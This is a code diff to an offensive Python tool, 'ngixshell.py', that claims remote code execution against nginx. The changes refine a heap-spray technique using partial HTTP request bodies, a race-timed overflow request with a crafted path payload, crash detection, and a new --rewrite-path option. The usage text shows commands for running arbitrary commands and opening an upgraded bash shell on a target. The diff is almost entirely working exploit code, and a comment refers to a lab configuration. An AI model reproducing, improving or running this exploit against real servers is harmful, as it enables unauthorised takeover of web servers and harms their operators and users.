@@ -1955,19 +1955,49 @@ def wait_alive(host: str, port: int, timeout: int = 30,
     return False
 
 
-def attempt(host, port, target_bytes, body, n_spray, body_len, tls, proxy):
+def attempt(host, port, target_bytes, body, n_spray, body_len, tls, proxy,
+            rewrite_path="/api"):
     sprays = []
+    # Incomplete-header heap spray: send request line + partial headers
+    # without the terminating \r\n\r\n.  nginx stays in "reading headers"
+    # state (up to client_header_timeout, default 60 s), holding the
+    # large_client_header_buffer allocation live for the duration of the
+    # trigger window.  This works regardless of location type or HTTP method
+    # because nginx never reaches the handler — the request is never
+    # dispatched.
+    #
+    # Previous technique sent Connection: close + a custom X-Delay header
+    # that required a non-standard nginx module; nginx processed requests
+    # immediately and freed all allocations before the trigger arrived,
+    # making the spray completely ineffective.
+    # The spray path must be handled by a location that reads the request
+    # body before responding (e.g. proxy_pass, fastcgi_pass).  Static-file
+    # locations (try_files) return 405 for POST before reading the body, so
+    # the body allocation is never made and the spray has no effect.
+    # The lab env/nginx.conf ships a /upload location backed by a dummy
+    # proxy_pass for exactly this purpose.
+    spray_path = "/upload"
     for i in range(n_spray):
         try:
             s = _connect(host, port, timeout=5, tls=tls, proxy=proxy)
-            s.sendall(b"POST /spray HTTP/1.1\r\nHost: l\r\nContent-Length: " +
-                      str(body_len).encode() + b"\r\nX-Delay: 60\r\nConnection: close\r\n\r\n" + body)
+            # Send complete headers + PARTIAL body (body_len bytes, but claim
+            # body_len*4 via Content-Length).  nginx buffers what it receives
+            # and then waits for the remaining bytes (up to client_body_timeout,
+            # default 60 s), holding our fake-struct allocation live.
+            hold_size = body_len * 4
+            s.sendall(
+                b"POST " + spray_path.encode() + b" HTTP/1.1\r\n"
+                b"Host: " + host.encode() + b"\r\n"
+                b"Content-Length: " + str(hold_size).encode() + b"\r\n"
+                b"Connection: keep-alive\r\n"
+                b"\r\n" + body          # partial body (len=body_len < hold_size)
+            )
             sprays.append(s)
         except Exception as e:
             vlog(f"[v] Spray {i}: {e}")
             break
         _sleep(0.005)
-    _sleep(0.2)
+    _sleep(0.3)
 
     try:
         a = _connect(host, port, timeout=5, tls=tls, proxy=proxy); _sleep(0.02)
@@ -1979,25 +2009,31 @@ def attempt(host, port, target_bytes, body, n_spray, body_len, tls, proxy):
             except: pass
         return False
 
+    path = rewrite_path.rstrip("/")
     payload = "A" * 349 + "+" * 969 + target_bytes.decode("latin-1")
-    a.sendall((f"GET /api/{payload} HTTP/1.1\r\nHost:localhost\r\n").encode("latin-1"))
+    # Split-send the trigger: send request line + partial headers on 'a',
+    # race with a concurrent GET on 'v', then complete 'a' headers.
+    # Previously hardcoded to /api/ and used X-Delay:60 (custom module
+    # dependency) — now uses --rewrite-path and standard Connection: close.
+    a.sendall((f"GET {path}/{payload} HTTP/1.1\r\nHost: {host}\r\n").encode("latin-1"))
     _sleep(0.05)
-    v.sendall(b"GET / HTTP/1.1\r\nHost:localhost\r\n")
+    v.sendall(b"GET / HTTP/1.1\r\nHost: " + host.encode() + b"\r\n")
     _sleep(0.05)
-    a.sendall(b"X-Delay:60\r\nConnection:close\r\n\r\n")
+    a.sendall(b"Connection: close\r\n\r\n")
     _sleep(0.2)
     v.close()
     _sleep(0.1)
 
     crashed = False
     try:
-        a.sendall(b"X-Ping:1\r\n")
+        a.sendall(b"X-Ping: 1\r\n")
         a.settimeout(0.2)
         if not a.recv(1): crashed = True
     except socket.timeout:
         try:
             ck = _connect(host, port, timeout=0.2, tls=tls, proxy=proxy)
-            ck.sendall(b"GET / HTTP/1.1\r\nHost:localhost\r\nConnection:close\r\n\r\n")
+            ck.sendall(b"GET / HTTP/1.1\r\nHost: " + host.encode() +
+                       b"\r\nConnection: close\r\n\r\n")
             crashed = not ck.recv(10)
             ck.close()
         except Exception as e:
@@ -2379,6 +2415,7 @@ Usage examples
 
   Exploit (RCE):
     ngixshell.py 127.0.0.1:19321 --cmd 'id'
+    ngixshell.py 127.0.0.1:19321 --cmd 'id' --rewrite-path /r
     ngixshell.py 127.0.0.1:19321 --shell
     ngixshell.py 127.0.0.1:19321 --shell --shell-type bash --upgrade-shell
 
@@ -2479,9 +2516,13 @@ Usage examples
 
     # ── Exploit tuning ────────────────────────────────────────────────────────
     tu = parser.add_argument_group("exploit tuning")
-    tu.add_argument("--tries",    type=int, default=10)
-    tu.add_argument("--spray",    type=int, default=20)
-    tu.add_argument("--body-len", type=int, default=4000)
+    tu.add_argument("--tries",        type=int,   default=10)
+    tu.add_argument("--spray",        type=int,   default=20)
+    tu.add_argument("--body-len",     type=int,   default=4000)
+    tu.add_argument("--rewrite-path", metavar="PATH", default="/api",
+                    help="nginx location with a rewrite rule that captures $1 "
+                         "(e.g. /r, /api, /search) — must match a 'rewrite … $1' "
+                         "block in the target's nginx.conf (default: /api)")
 
     # ── Subdomain scan ────────────────────────────────────────────────────────
     sd = parser.add_argument_group("subdomain scan")
@@ -2646,7 +2687,8 @@ Usage examples
                                 log("    server not recovering, aborting")
                                 return 1
                         if attempt(t_host, t_port, target_b, body,
-                                   args.spray, args.body_len, use_tls, args.proxy):
+                                   args.spray, args.body_len, use_tls, args.proxy,
+                                   rewrite_path=args.rewrite_path):
                             success     = True
                             winner_addr = addr
                             winner_try  = an + 1
